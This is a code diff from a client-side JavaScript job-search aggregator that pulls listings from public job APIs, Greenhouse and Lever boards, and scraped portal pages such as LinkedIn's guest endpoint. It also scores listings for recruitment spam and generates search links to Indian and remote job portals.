+                { n: 'ProtoPie', token: 'protopie' }, { n: 'Principle', token: 'principle' }, { n: 'Framer', token: 'framer' },
+                { n: 'Webflow', token: 'webflow' }, { n: 'Wix', token: 'wix' }, { n: 'Squarespace', token: 'squarespace' },
+                { n: 'GoDaddy', token: 'godaddy' }, { n: 'Namecheap', token: 'namecheap' }, { n: 'Cloudflare', token: 'cloudflare' },
+                { n: 'Fastly', token: 'fastly' }, { n: 'Akamai', token: 'akamai' }, { n: 'CloudFront', token: 'amazon' },
+                { n: 'DigitalOcean', token: 'digitalocean' }, { n: 'Linode', token: 'linode' }, { n: 'Vultr', token: 'vultr' },
+                { n: 'Hetzner', token: 'hetzner' }, { n: 'OVH', token: 'ovh' }, { n: 'Scaleway', token: 'scaleway' },
+                { n: 'Render', token: 'render' }, { n: 'Railway', token: 'railway' }, { n: 'Fly.io', token: 'flyio' },
+                { n: 'Heroku', token: 'heroku' }, { n: 'Platform.sh', token: 'platformsh' }, { n: 'Pantheon', token: 'pantheon' },
+                { n: 'WP Engine', token: 'wpengine' }, { n: 'Kinsta', token: 'kinsta' }, { n: 'Cloudways', token: 'cloudways' },
+                // CHENNAI / TAMIL NADU TECH COMPANIES
+                { n: 'Zoho', token: 'zohocorp' }, { n: 'Freshworks', token: 'freshworks' }, { n: 'Chargebee', token: 'chargebee' },
+                { n: 'Kissflow', token: 'kissflow' }, { n: 'Kovai.co', token: 'kovaico' }, { n: 'Facilio', token: 'facilio' },
+                { n: 'Indix', token: 'indix' }, { n: 'ChargeBee', token: 'chargebee' }, { n: 'Securin', token: 'securin' },
+                { n: 'Ideas2IT', token: 'ideas2it' }, { n: 'Aspire Systems', token: 'aspiresystems' }, { n: 'Payoda', token: 'payoda' },
+                { n: 'GAVS Technologies', token: 'gavstechnologies' }, { n: 'Ramco Systems', token: 'ramcosystems' },
+                { n: 'Intellect Design', token: 'intellectdesign' }, { n: 'Temenos', token: 'temenos' },
+                { n: 'Tata Elxsi', token: 'tataelxsi' }, { n: 'Verizon Chennai', token: 'verizon' },
+                { n: 'Cognizant Chennai', token: 'cognizant' }, { n: 'TCS Chennai', token: 'tcs' },
+                { n: 'Infosys Chennai', token: 'infosys' }, { n: 'Wipro Chennai', token: 'wipro' },
+                { n: 'HCL Chennai', token: 'hcltech' }, { n: 'Tech Mahindra Chennai', token: 'techmahindra' },
+                { n: 'Accenture Chennai', token: 'accenture' }, { n: 'Capgemini Chennai', token: 'capgemini' },
+                { n: 'IBM Chennai', token: 'ibm' }, { n: 'Amazon Chennai', token: 'amazon' },
+                { n: 'Microsoft Chennai', token: 'microsoft' }, { n: 'Google Chennai', token: 'google' },
+                { n: 'Oracle Chennai', token: 'oracle' }, { n: 'SAP Chennai', token: 'sap' },
+                { n: 'PayPal Chennai', token: 'paypal' }, { n: 'Fidelity Chennai', token: 'fidelity' },
+                { n: 'BNY Mellon Chennai', token: 'bnymellon' }, { n: 'Standard Chartered Chennai', token: 'standardchartered' },
+                { n: 'Citi Chennai', token: 'citi' }, { n: 'HSBC Chennai', token: 'hsbc' },
+                { n: 'Barclays Chennai', token: 'barclays' }, { n: 'Deutsche Bank Chennai', token: 'deutschebank' },
+            ],
+            LEVER_COMPANIES: [
+                // Top Tech
+                { n: 'Netflix', token: 'netflix' }, { n: 'Spotify', token: 'spotify' }, { n: 'Uber', token: 'uber' },
+                { n: 'Lyft', token: 'lyft' }, { n: 'Robinhood', token: 'robinhood' }, { n: 'Instacart', token: 'instacart' },
+                { n: 'DoorDash', token: 'doordash' }, { n: 'Pinterest', token: 'pinterest' }, { n: 'Atlassian', token: 'atlassian' },
+                { n: 'Zoom', token: 'zoom' }, { n: 'Okta', token: 'okta' }, { n: 'HackerRank', token: 'hackerrank' },
+                { n: 'Unacademy', token: 'unacademy' }, { n: 'Twitter', token: 'twitter' }, { n: 'Snap', token: 'snap' },
+                { n: 'Reddit', token: 'reddit' }, { n: 'Discord', token: 'discord' }, { n: 'Slack', token: 'slack' },
+                { n: 'Twitch', token: 'twitch' }, { n: 'TikTok', token: 'bytedance' }, { n: 'LinkedIn', token: 'linkedin' },
+                // Fintech Lever
+                { n: 'Stripe', token: 'stripe' }, { n: 'Square', token: 'square' }, { n: 'PayPal', token: 'paypal' },
+                { n: 'Venmo', token: 'venmo' }, { n: 'Cash App', token: 'cashapp' }, { n: 'Zelle', token: 'zelle' },
+                { n: 'Plaid', token: 'plaid' }, { n: 'Marqeta', token: 'marqeta' }, { n: 'Toast', token: 'toasttab' },
+                { n: 'Clover', token: 'clover' }, { n: 'Lightspeed', token: 'lightspeed' }, { n: 'Shopify', token: 'shopify' },
+                // India Lever Companies
+                { n: 'Gojek', token: 'gojek' }, { n: 'Grab', token: 'grab' }, { n: 'Sea', token: 'sea' },
+                { n: 'Tokopedia', token: 'tokopedia' }, { n: 'Bukalapak', token: 'bukalapak' }, { n: 'Traveloka', token: 'traveloka' },
+                { n: 'OVO', token: 'ovo' }, { n: 'Dana', token: 'dana' }, { n: 'GoPay', token: 'gopay' },
+                { n: 'Paytm', token: 'paytm' }, { n: 'PhonePe', token: 'phonepe' }, { n: 'Google Pay', token: 'googlepay' },
+                // More Lever Companies
+                { n: 'Segment', token: 'segment' }, { n: 'mParticle', token: 'mparticle' }, { n: 'Rudderstack', token: 'rudderstack' },
+                { n: 'Heap', token: 'heap' }, { n: 'FullStory', token: 'fullstory' }, { n: 'LogRocket', token: 'logrocket' },
+                { n: 'Hotjar', token: 'hotjar' }, { n: 'Crazy Egg', token: 'crazyegg' }, { n: 'VWO', token: 'vwo' },
+                { n: 'Optimizely', token: 'optimizely' }, { n: 'LaunchDarkly', token: 'launchdarkly' }, { n: 'Split', token: 'split' },
+                { n: 'Statsig', token: 'statsig' }, { n: 'Eppo', token: 'eppo' }, { n: 'GrowthBook', token: 'growthbook' },
+                { n: 'PostHog', token: 'posthog' }, { n: 'Plausible', token: 'plausible' }, { n: 'Fathom', token: 'fathom' },
+                { n: 'Simple Analytics', token: 'simpleanalytics' }, { n: 'Matomo', token: 'matomo' }, { n: 'Piwik', token: 'piwik' },
+                // Enterprise Lever
+                { n: 'ServiceNow', token: 'servicenow' }, { n: 'Workday', token: 'workday' }, { n: 'Salesforce', token: 'salesforce' },
+                { n: 'SAP', token: 'sap' }, { n: 'Oracle', token: 'oracle' }, { n: 'IBM', token: 'ibm' },
+                { n: 'Cisco', token: 'cisco' }, { n: 'VMware', token: 'vmware' }, { n: 'Dell', token: 'dell' },
+                { n: 'HPE', token: 'hpe' }, { n: 'NetApp', token: 'netapp' }, { n: 'Pure Storage', token: 'purestorage' },
+                { n: 'Nutanix', token: 'nutanix' }, { n: 'Rubrik', token: 'rubrik' }, { n: 'Cohesity', token: 'cohesity' },
+                { n: 'Veeam', token: 'veeam' }, { n: 'Commvault', token: 'commvault' }, { n: 'Veritas', token: 'veritas' },
+                // Security Lever
+                { n: 'CrowdStrike', token: 'crowdstrike' }, { n: 'SentinelOne', token: 'sentinelone' }, { n: 'Carbon Black', token: 'carbonblack' },
+                { n: 'Cylance', token: 'cylance' }, { n: 'Tanium', token: 'tanium' }, { n: 'Rapid7', token: 'rapid7' },
+                { n: 'Qualys', token: 'qualys' }, { n: 'Tenable', token: 'tenable' }, { n: 'BeyondTrust', token: 'beyondtrust' },
+                { n: 'CyberArk', token: 'cyberark' }, { n: 'Thycotic', token: 'thycotic' }, { n: 'HashiCorp', token: 'hashicorp' },
+                { n: '1Password', token: '1password' }, { n: 'LastPass', token: 'lastpass' }, { n: 'Dashlane', token: 'dashlane' },
+                { n: 'Keeper', token: 'keeper' }, { n: 'Bitwarden', token: 'bitwarden' }, { n: 'NordVPN', token: 'nordvpn' },
+                { n: 'ExpressVPN', token: 'expressvpn' }, { n: 'Surfshark', token: 'surfshark' }, { n: 'ProtonVPN', token: 'protonvpn' },
+            ],
+
+            // --- PORTAL SCRAPERS with CORS Proxy ---
+            async remotive(kw) {
+                try {
+                    // Try direct first (Remotive has CORS headers)
+                    const res = await fetch(`https://remotive.com/api/remote-jobs?search=${encodeURIComponent(kw)}&limit=20`);
+                    if (res.ok) {
+                        const d = await res.json();
+                        this.log(`✅ Remotive: ${d.jobs?.length || 0} jobs for "${kw}"`);
+                        return d.jobs ? d.jobs.map(j => ({
+                            role: j.title, company: j.company_name, link: j.url, location: 'Remote',
+                            date: j.publication_date, type: 'Job', src: 'Remotive'
+                        })) : [];
+                    }
+                } catch (e) {
+                    // this.log(`⚠️ Remotive API failed for "${kw}"`);
+                }
+                return [];
+            },
+
+            async jobicy(kw) {
+                try {
+                    // Use CORS proxy for Jobicy
+                    const url = `https://jobicy.com/api/v2/remote-jobs?count=50&tag=${encodeURIComponent(kw)}`;
+                    const res = await fetch(this.CORS_PROXY + encodeURIComponent(url));
+                    if (res.ok) {
+                        const d = await res.json();
+                        this.log(`✅ Jobicy: ${d.jobs?.length || 0} jobs for "${kw}"`);
+                        return d.jobs ? d.jobs.map(j => ({
+                            role: j.jobTitle, company: j.companyName, link: j.url, location: 'Remote',
+                            date: j.pubDate, type: 'Job', src: 'Jobicy'
+                        })) : [];
+                    }
+                } catch (e) {
+                    // this.log(`⚠️ Jobicy API failed for "${kw}"`);
+                }
+                return [];
+            },
+
+            // LINKEDIN GUEST API - Best free source! Real direct job links from LinkedIn!
+            async linkedinGuest(kw, location = 'chennai') {
+                const jobs = [];
+                // Fetch 4 pages (100 jobs) per keyword/location for MAXIMUM coverage
+                const offsets = [0, 25, 50, 75];
+
+                for (const start of offsets) {
+                    try {
+                        // LinkedIn's public guest API endpoint - no login needed!
+                        const url = `https://www.linkedin.com/jobs-guest/jobs/api/seeMoreJobPostings/search?keywords=${encodeURIComponent(kw)}&location=${encodeURIComponent(location)}&start=${start}`;
+                        const res = await fetch(this.CORS_PROXY + encodeURIComponent(url));
+
+                        if (res.ok) {
+                            const html = await res.text();
+                            const parser = new DOMParser();
+                            const doc = parser.parseFromString(html, 'text/html');
+
+                            // Parse LinkedIn job cards
+                            const cards = doc.querySelectorAll('li');
+                            if (cards.length === 0) break;
+
+                            cards.forEach(card => {
+                                const titleEl = card.querySelector('h3.base-search-card__title');
+                                const linkEl = card.querySelector('a.base-card__full-link');
+                                const companyEl = card.querySelector('h4.base-search-card__subtitle');
+                                const locEl = card.querySelector('span.job-search-card__location');
+                                const dateEl = card.querySelector('time');
+
+                                if (titleEl && linkEl) {
+                                    const link = linkEl.getAttribute('href')?.split('?')[0] || '';
+                                    jobs.push({
+                                        role: titleEl.textContent?.trim() || 'Unknown',
+                                        company: companyEl?.textContent?.trim() || 'LinkedIn',
+                                        link: link,
+                                        location: locEl?.textContent?.trim() || location,
+                                        date: dateEl?.getAttribute('datetime') || new Date().toISOString(),
+                                        type: 'Job',
+                                        src: 'LinkedIn',
+                                        exp: this.guessExp(titleEl.textContent || '')
+                                    });
+                                }
+                            });
+                            // Random delay to be nice
+                            await new Promise(r => setTimeout(r, 500 + Math.random() * 500));
+                        } else {
+                            break;
+                        }
+                    } catch (e) {
+                        break;
+                    }
+                }
+                this.log(`✅ LinkedIn Guest: ${jobs.length} REAL jobs for "${kw}" in ${location}`);
+                return jobs;
+            },
+
+            // ARBEITNOW API - Tech jobs, filters for India/Remote
+            async arbeitnow(kw) {
+                const jobs = [];
+                try {
+                    const url = `https://www.arbeitnow.com/api/job-board-api?search=${encodeURIComponent(kw)}`;
+                    const res = await fetch(url);
+
+                    if (res.ok) {
+                        const data = await res.json();
+                        (data.data || []).forEach(job => {
+                            const loc = job.location || 'Remote';
+                            // Filter for India/Remote only
+                            if (!/(india|remote|anywhere|worldwide)/i.test(loc)) return;
+
+                            jobs.push({
+                                role: job.title || 'Unknown',
+                                company: job.company_name || 'Unknown',
+                                link: job.url || '',
+                                location: loc,
+                                date: job.created_at?.substring(0, 10) || new Date().toISOString(),
+                                type: 'Job',
+                                src: 'Arbeitnow',
+                                exp: this.guessExp(job.title || '')
+                            });
+                        });
+                        this.log(`✅ Arbeitnow: ${jobs.length} jobs for "${kw}"`);
+                    }
+                } catch (e) {
+                    // this.log(`⚠️ Arbeitnow API failed for "${kw}"`);
+                }
+                return jobs;
+            },
+
+            // WEWORKREMOTELY - Remote jobs only
+            async weworkremotely(kw) {
+                const jobs = [];
+                try {
+                    const url = `https://weworkremotely.com/remote-jobs/search?term=${encodeURIComponent(kw)}`;
+                    const res = await fetch(this.CORS_PROXY + encodeURIComponent(url));
+
+                    if (res.ok) {
+                        const html = await res.text();
+                        const parser = new DOMParser();
+                        const doc = parser.parseFromString(html, 'text/html');
+
+                        const cards = doc.querySelectorAll('li.feature, section.jobs li');
+                        cards.forEach(card => {
+                            const titleEl = card.querySelector('span.title, a');
+                            const companyEl = card.querySelector('span.company, h3');
+                            const linkEl = card.querySelector('a[href*="/remote-jobs/"]');
+
+                            if (titleEl && linkEl) {
+                                let link = linkEl.getAttribute('href') || '';
+                                if (link && !link.startsWith('http')) {
+                                    link = 'https://weworkremotely.com' + link;
+                                }
+
+                                jobs.push({
+                                    role: titleEl.textContent?.trim() || 'Unknown',
+                                    company: companyEl?.textContent?.trim() || 'Unknown',
+                                    link: link,
+                                    location: 'Remote',
+                                    date: new Date().toISOString(),
+                                    type: 'Job',
+                                    src: 'WWR',
+                                    exp: this.guessExp(titleEl.textContent || '')
+                                });
+                            }
+                        });
+                        this.log(`✅ WeWorkRemotely: ${jobs.length} jobs for "${kw}"`);
+                    }
+                } catch (e) {
+                    // this.log(`⚠️ WeWorkRemotely failed for "${kw}"`);
+                }
+                return jobs;
+            },
+
+            // HIMALAYAS API - Remote jobs with proper API
+            async himalayas(kw) {
+                const jobs = [];
+                try {
+                    const url = `https://himalayas.app/jobs/api?q=${encodeURIComponent(kw)}&limit=50`;
+                    const res = await fetch(url);
+
+                    if (res.ok) {
+                        const data = await res.json();
+                        (data.jobs || []).forEach(job => {
+                            jobs.push({
+                                role: job.title || 'Unknown',
+                                company: job.company_name || 'Unknown',
+                                link: job.url || `https://himalayas.app/companies/${job.company_slug || ''}`,
+                                location: 'Remote',
+                                date: job.published_at?.substring(0, 10) || new Date().toISOString(),
+                                type: 'Job',
+                                src: 'Himalayas',
+                                salary: job.salary_text || '',
+                                exp: this.guessExp(job.title || '')
+                            });
+                        });
+                        this.log(`✅ Himalayas: ${jobs.length} jobs for "${kw}"`);
+                    }
+                } catch (e) {
+                    // this.log(`⚠️ Himalayas API failed for "${kw}"`);
+                }
+                return jobs;
+            },
+
+            // FINDWORK API - Developer jobs
+            async findwork(kw) {
+                const jobs = [];
+                try {
+                    const url = `https://findwork.dev/api/jobs/?search=${encodeURIComponent(kw)}&location=india`;
+                    const res = await fetch(url);
+
+                    if (res.ok) {
+                        const data = await res.json();
+                        (data.results || []).forEach(job => {
+                            jobs.push({
+                                role: job.role || 'Unknown',
+                                company: job.company_name || 'Unknown',
+                                link: job.url || '',
+                                location: job.location || 'Remote',
+                                date: job.date_posted?.substring(0, 10) || new Date().toISOString(),
+                                type: 'Job',
+                                src: 'Findwork',
+                                exp: this.guessExp(job.role || '')
+                            });
+                        });
+                        this.log(`✅ Findwork: ${jobs.length} jobs for "${kw}"`);
+                    }
+                } catch (e) {
+                    // this.log(`⚠️ Findwork API failed for "${kw}"`);
+                }
+                return jobs;
+            },
+
+            // INTERNSHALA GUEST SCRAPER
+            async scrapeInternshala(kw) {
+                const jobs = [];
+                try {
+                    const url = `https://internshala.com/internships/keywords-${encodeURIComponent(kw)}`;
+                    const res = await fetch(this.CORS_PROXY + encodeURIComponent(url));
+                    if (res.ok) {
+                        const html = await res.text();
+                        const parser = new DOMParser();
+                        const doc = parser.parseFromString(html, 'text/html');
+                        const cards = doc.querySelectorAll('.individual_internship');
+
+                        cards.forEach(card => {
+                            const titleEl = card.querySelector('.job-title-href') || card.querySelector('.profile_link');
+                            const companyEl = card.querySelector('.link_display_like_text');
+                            const locEl = card.querySelector('.location_link');
+                            const linkEl = card.querySelector('.view_detail_button') || titleEl;
+
+                            if (titleEl && companyEl) {
+                                let link = linkEl ? linkEl.getAttribute('href') : '';
+                                if (link && !link.startsWith('http')) link = 'https://internshala.com' + link;
+
+                                jobs.push({
+                                    role: titleEl.textContent.trim(),
+                                    company: companyEl.textContent.trim(),
+                                    link: link,
+                                    location: locEl ? locEl.textContent.trim() : 'India',
+                                    date: new Date().toISOString(),
+                                    type: 'Job',
+                                    src: 'Internshala',
+                                    exp: '0-1' // Internships are usually freshers
+                                });
+                            }
+                        });
+                        this.log(`✅ Internshala: ${jobs.length} internships for "${kw}"`);
+                    }
+                } catch (e) { }
+
+                // Fallback to Smart Link if scraping fails
+                if (jobs.length === 0) {
+                    jobs.push({
+                        role: `Search "${kw}" on Internshala`,
+                        company: 'Internshala',
+                        link: `https://internshala.com/internships/keywords-${encodeURIComponent(kw)}`,
+                        location: 'India',
+                        date: new Date().toISOString(),
+                        type: 'SearchLink',
+                        src: 'Internshala',
+                        matchType: 'link',
+                        exp: '0-1'
+                    });
+                }
+                return jobs;
+            },
+
+            // SHINE GUEST SCRAPER
+            async scrapeShine(kw) {
+                const jobs = [];
+                try {
+                    const url = `https://www.shine.com/job-search/${encodeURIComponent(kw)}-jobs`;
+                    const res = await fetch(this.CORS_PROXY + encodeURIComponent(url));
+                    if (res.ok) {
+                        const html = await res.text();
+                        const parser = new DOMParser();
+                        const doc = parser.parseFromString(html, 'text/html');
+                        // Shine uses class 'jobCard' or similar structure
+                        const cards = doc.querySelectorAll('.jobCard, .job_list_item');
+
+                        cards.forEach(card => {
+                            const titleEl = card.querySelector('h2 a');
+                            const companyEl = card.querySelector('.jobCard_jobIcon__3_szE') || card.querySelector('.jobCard_jobIcon__2-xU7'); // Classes change, try generic
+                            const locEl = card.querySelector('.jobCard_locationIcon__3iN-7');
+
+                            // Fallback selectors if classes are dynamic
+                            const title = titleEl ? titleEl.textContent.trim() : (card.querySelector('h2') ? card.querySelector('h2').textContent.trim() : '');
+                            const company = companyEl ? companyEl.textContent.trim() : (card.querySelector('.company_name') ? card.querySelector('.company_name').textContent.trim() : 'Shine Employer');
+
+                            if (title) {
+                                let link = titleEl ? titleEl.getAttribute('href') : '';
+                                if (link && !link.startsWith('http')) link = 'https://www.shine.com' + link;
+
+                                jobs.push({
+                                    role: title,
+                                    company: company,
+                                    link: link,
+                                    location: locEl ? locEl.textContent.trim() : 'India',
+                                    date: new Date().toISOString(),
+                                    type: 'Job',
+                                    src: 'Shine',
+                                    exp: this.guessExp(title)
+                                });
+                            }
+                        });
+                        this.log(`✅ Shine: ${jobs.length} jobs for "${kw}"`);
+                    }
+                } catch (e) { }
+
+                // Fallback to Smart Link if scraping fails
+                if (jobs.length === 0) {
+                    jobs.push({
+                        role: `Search "${kw}" on Shine`,
+                        company: 'Shine',
+                        link: `https://www.shine.com/job-search/${encodeURIComponent(kw)}-jobs`,
+                        location: 'India',
+                        date: new Date().toISOString(),
+                        type: 'SearchLink',
+                        src: 'Shine',
+                        matchType: 'link',
+                        exp: '0-5'
+                    });
+                }
+                return jobs;
+            },
+
+            // FOUNDIT (Monster) - Smart Link / Best Effort
+            async scrapeFoundit(kw) {
+                // Foundit is SPA, hard to scrape without dynamic rendering. 
+                // Return a "Smart Link" that looks like a job but opens the search results.
+                return [{
+                    role: `Search "${kw}" on Foundit`,
+                    company: 'Foundit (Monster)',
+                    link: `https://www.foundit.in/srp/results?query=${encodeURIComponent(kw)}`,
+                    location: 'India',
+                    date: new Date().toISOString(),
+                    type: 'SearchLink', // Changed to SearchLink so it goes to bottom
+                    src: 'Foundit',
+                    matchType: 'link',
+                    exp: '0-5'
+                }];
+            },
+
+            // HIRIST - Smart Link
+            async scrapeHirist(kw) {
+                return [{
+                    role: `Search "${kw}" on Hirist`,
+                    company: 'Hirist',
+                    link: `https://www.hirist.tech/search/${encodeURIComponent(kw)}`,
+                    location: 'India',
+                    date: new Date().toISOString(),
+                    type: 'SearchLink',
+                    src: 'Hirist',
+                    matchType: 'link',
+                    exp: '0-5'
+                }];
+            },
+
+            // WORKDAY (via Google) - Smart Link
+            async scrapeWorkday(kw) {
+                return [{
+                    role: `Search "${kw}" on Workday Jobs`,
+                    company: 'Workday (Global)',
+                    link: `https://www.google.com/search?q=site:myworkdayjobs.com+${encodeURIComponent(kw)}`,
+                    location: 'Global',
+                    date: new Date().toISOString(),
+                    type: 'SearchLink',
+                    src: 'Workday',
+                    matchType: 'link',
+                    exp: 'Varies'
+                }];
+            },
+
+            // INDEED - Smart Link
+            async scrapeIndeed(kw) {
+                return [{
+                    role: `Search "${kw}" on Indeed`,
+                    company: 'Indeed',
+                    link: `https://in.indeed.com/jobs?q=${encodeURIComponent(kw)}&l=India`,
+                    location: 'India',
+                    date: new Date().toISOString(),
+                    type: 'SearchLink',
+                    src: 'Indeed',
+                    matchType: 'link',
+                    exp: 'Varies'
+                }];
+            },
+
+            // GLASSDOOR - Smart Link
+            async scrapeGlassdoor(kw) {
+                return [{
+                    role: `Search "${kw}" on Glassdoor`,
+                    company: 'Glassdoor',
+                    link: `https://www.glassdoor.co.in/Job/india-${encodeURIComponent(kw.replace(/ /g, '-'))}-jobs-SRCH_IL.0,5_IN115_KO6,${6 + kw.length}.htm`,
+                    location: 'India',
+                    date: new Date().toISOString(),
+                    type: 'SearchLink',
+                    src: 'Glassdoor',
+                    matchType: 'link',
+                    exp: 'Varies'
+                }];
+            },
+
+            // HIREPRO - Smart Link
+            async scrapeHirepro(kw) {
+                return [{
+                    role: `Search "${kw}" on Hirepro`,
+                    company: 'Hirepro',
+                    link: `https://www.hirepro.in/jobs?search=${encodeURIComponent(kw)}`,
+                    location: 'India',
+                    date: new Date().toISOString(),
+                    type: 'SearchLink',
+                    src: 'Hirepro',
+                    matchType: 'link',
+                    exp: 'Varies'
+                }];
+            },
+
+
+
+            // Fetch from known Greenhouse companies (PARALLEL BATCHES for speed)
+            async scrapeGreenhouseCompanies() {
+                this.log(`🌿 Fetching from ${this.GREENHOUSE_COMPANIES.length} Greenhouse companies...`);
+                const BATCH_SIZE = 150; // HYPER-SPEED: 150 concurrent requests
+                let successCount = 0;
+
+                for (let i = 0; i < this.GREENHOUSE_COMPANIES.length; i += BATCH_SIZE) {
+                    const batch = this.GREENHOUSE_COMPANIES.slice(i, i + BATCH_SIZE);
+                    document.getElementById('status-text').innerText = `Greenhouse: ${i}/${this.GREENHOUSE_COMPANIES.length}...`;
+
+                    const results = await Promise.allSettled(batch.map(async c => {
+                        try {
+                            const res = await fetch(`https://boards-api.greenhouse.io/v1/boards/${c.token}/jobs`);
+                            if (res.ok) {
+                                const d = await res.json();
+                                if (d.jobs && d.jobs.length > 0) {
+                                    d.jobs.forEach(j => {
+                                        this.add({
+                                            role: j.title,
+                                            company: c.n,
+                                            link: j.absolute_url,
+                                            location: j.location?.name || 'Remote',
+                                            type: 'Job',
+                                            date: j.updated_at,
+                                            src: 'Greenhouse',
+                                            exp: this.guessExp(j.title)
+                                        });
+                                    });
+                                    return { success: true, company: c.n, count: d.jobs.length };
+                                }
+                            }
+                            return { success: false };
+                        } catch (e) { return { success: false }; }
+                    }));
+
+                    results.forEach(r => {
+                        if (r.status === 'fulfilled' && r.value.success) {
+                            successCount++;
+                        }
+                    });
+
+                    // Update UI after each batch
+                    this.filter();
+                    await new Promise(r => setTimeout(r, 100));
+                }
+                this.log(`✅ Greenhouse: ${successCount} companies had jobs`);
+            },
+
+            // Fetch from known Lever companies (PARALLEL BATCHES for speed)
+            async scrapeLeverCompanies() {
+                this.log(`⚡ Fetching from ${this.LEVER_COMPANIES.length} Lever companies...`);
+                const BATCH_SIZE = 150; // HYPER-SPEED: 150 concurrent requests
+                let successCount = 0;
+
+                for (let i = 0; i < this.LEVER_COMPANIES.length; i += BATCH_SIZE) {
+                    const batch = this.LEVER_COMPANIES.slice(i, i + BATCH_SIZE);
+                    document.getElementById('status-text').innerText = `Lever: ${i}/${this.LEVER_COMPANIES.length}...`;
+
+                    const results = await Promise.allSettled(batch.map(async c => {
+                        try {
+                            const res = await fetch(`https://api.lever.co/v0/postings/${c.token}`);
+                            if (res.ok) {
+                                const d = await res.json();
+                                if (Array.isArray(d) && d.length > 0) {
+                                    d.forEach(j => {
+                                        this.add({
+                                            role: j.text,
+                                            company: c.n,
+                                            link: j.applyUrl || j.hostedUrl,
+                                            location: j.categories?.location || 'Remote',
+                                            type: 'Job',
+                                            src: 'Lever',
+                                            exp: this.guessExp(j.text)
+                                        });
+                                    });
+                                    return { success: true, company: c.n, count: Math.min(d.length, 15) };
+                                }
+                            }
+                            return { success: false };
+                        } catch (e) { return { success: false }; }
+                    }));
+
+                    results.forEach(r => {
+                        if (r.status === 'fulfilled' && r.value.success) {
+                            successCount++;
+                        }
+                    });
+
+                    this.filter();
+                    await new Promise(r => setTimeout(r, 100));
+                }
+                this.log(`✅ Lever: ${successCount} companies had jobs`);
+            },
+
+            // SPAM DETECTION (from portal_radar.py)
+            SPAM_PATTERNS: {
+                company: ['consultanc', 'staffing', 'placement', 'recruitment', 'hr solution', 'manpower'],
+                title: ['urgent hiring', 'walk-in', 'immediate joiner', 'freshers only']
+            },
+            GOOD_COMPANIES: ['google', 'microsoft', 'amazon', 'meta', 'apple', 'netflix', 'uber', 'flipkart',
+                'razorpay', 'swiggy', 'zomato', 'phonepe', 'cred', 'paytm', 'infosys', 'tcs', 'wipro',
+                'cognizant', 'accenture', 'deloitte', 'atlassian', 'salesforce', 'oracle', 'adobe', 'nvidia'],
+
+            calcSpamScore(job) {
+                let score = 0;
+                const company = (job.company || '').toLowerCase();
+                const title = (job.role || '').toLowerCase();
+
+                for (const p of this.SPAM_PATTERNS.company) {
+                    if (company.includes(p)) { score += 30; break; }
+                }
+                for (const p of this.SPAM_PATTERNS.title) {
+                    if (title.includes(p)) { score += 25; break; }
+                }
+                if (['unknown', '', 'confidential'].includes(company)) score += 15;
+                for (const gc of this.GOOD_COMPANIES) {
+                    if (company.includes(gc)) { score = Math.max(0, score - 40); break; }
+                }
+                return Math.min(100, Math.max(0, score));
+            },
+
+            // Generate Search Links for Major Portals (optional)
+            async generateLinks() {
+                const kws = document.getElementById('keywords').value.split(',').map(s => s.trim()).filter(x => x);
+                if (kws.length === 0) return;
+
+                const portals = [
+                    // Major Global Portals
+                    { name: 'LinkedIn', url: (kw) => `https://www.linkedin.com/jobs/search/?keywords=${encodeURIComponent(kw)}&location=India` },
+                    { name: 'Indeed', url: (kw) => `https://in.indeed.com/jobs?q=${encodeURIComponent(kw)}&l=India` },
+                    { name: 'Glassdoor', url: (kw) => `https://www.glassdoor.co.in/Job/india-${encodeURIComponent(kw.replace(/ /g, '-'))}-jobs-SRCH_IL.0,5_IN115_KO6,${6 + kw.length}.htm` },
+                    { name: 'Google Jobs', url: (kw) => `https://www.google.com/search?q=${encodeURIComponent(kw)}+jobs+india&ibp=htl;jobs` },
+
+                    // Major India Portals (THE BIG ONES)
+                    { name: 'Naukri', url: (kw) => `https://www.naukri.com/${encodeURIComponent(kw.replace(/ /g, '-'))}-jobs` },
+                    { name: 'Shine', url: (kw) => `https://www.shine.com/job-search/${encodeURIComponent(kw.replace(/ /g, '-'))}-jobs` },
+                    { name: 'Foundit', url: (kw) => `https://www.foundit.in/srp/results?query=${encodeURIComponent(kw)}&locations=India` },
+                    { name: 'TimesJobs', url: (kw) => `https://www.timesjobs.com/candidate/job-search.html?searchType=personalBized&from=submit&txtKeywords=${encodeURIComponent(kw)}&txtLocation=India` },
+                    { name: 'Apna', url: (kw) => `https://apna.co/jobs?title=${encodeURIComponent(kw)}` },
+
+                    // Startup & Tech Portals
+                    { name: 'Instahyre', url: (kw) => `https://www.instahyre.com/search-jobs/?job_title=${encodeURIComponent(kw)}&location=India` },
+                    { name: 'AngelList', url: (kw) => `https://wellfound.com/role/l/software-engineer/india?keywords=${encodeURIComponent(kw)}` },
+                    { name: 'Cutshort', url: (kw) => `https://cutshort.io/jobs?q=${encodeURIComponent(kw)}&location=India` },
+                    { name: 'Hirist', url: (kw) => `https://www.hirist.tech/jobs?query=${encodeURIComponent(kw)}` },
+
+                    // Enterprise ATS / Recruiting Platforms (Removed generic ATS search links as they require specific company portals)
+                    // only keeping aggregators or valid search engines
+
+                    // Freshers & Internships
+                    { name: 'Freshersworld', url: (kw) => `https://www.freshersworld.com/jobs/search?q=${encodeURIComponent(kw)}` },
+                    { name: 'Internshala', url: (kw) => `https://internshala.com/jobs/keywords-${encodeURIComponent(kw.replace(/ /g, '-'))}` },
+                    { name: 'iimjobs', url: (kw) => `https://www.iimjobs.com/search?q=${encodeURIComponent(kw)}` },
+
+                    // Remote Job Boards
+                    { name: 'Remotive', url: (kw) => `https://remotive.com/remote-jobs/search?query=${encodeURIComponent(kw)}` },
+                    { name: 'Jobicy', url: (kw) => `https://jobicy.com/jobs/?s=${encodeURIComponent(kw)}` },
+                    { name: 'WeWorkRemotely', url: (kw) => `https://weworkremotely.com/remote-jobs/search?term=${encodeURIComponent(kw)}` },
+                ];
+
+                for (const kw of kws) {
+                    for (const portal of portals) {
+                        // Push directly to searchLinks array - NOT to main jobs array
+                        this.state.searchLinks.push({
+                            role: `🔎 Search "${kw}" on ${portal.name}`,
+                            company: portal.name,
+                            link: portal.url(kw),
+                            location: 'India',
+                            type: 'SearchLink',
+                            src: portal.name,
+                            matchType: 'link',
+                            date: new Date().toISOString(),
+                            exp: '0-2',
+                            trust: portal.name === 'Google Jobs' ? 95 : 65
+                        });
+                    }
+                }
+                this.log(`Generated ${kws.slice(0, 2).length * portals.length} quick search links`);
+            },
+
+            async scrapePortals() {
+                const kws = document.getElementById('keywords').value.split(',').map(s => s.trim()).filter(x => x);
+                if (kws.length === 0) return;
+
+                this.log("🌐 Fetching REAL jobs from remote job portals...");
+
